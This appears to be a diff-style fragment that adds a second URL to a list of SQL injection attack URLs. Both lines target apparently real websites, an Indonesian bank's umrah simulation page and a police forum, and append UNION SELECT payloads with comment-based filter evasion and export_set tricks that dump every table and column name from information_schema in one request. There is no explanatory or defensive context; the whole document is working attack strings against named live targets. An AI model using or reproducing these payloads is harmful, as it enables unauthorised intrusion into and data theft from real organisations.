@@ -1,1 +1,3 @@
 https://www.syariahmandiri.co.id/simulasi-umroh/index.php?module=content&id=11%27%20div%200/*!00000union*/%20select%201,export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2),3,4,5,6--%20-
+
+http://rimdikpns.ssdm.polri.go.id/forum/view.php?userid=75' div 0/*!00000union*/ select 1,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),3,4,5,6,7,8,9-- -
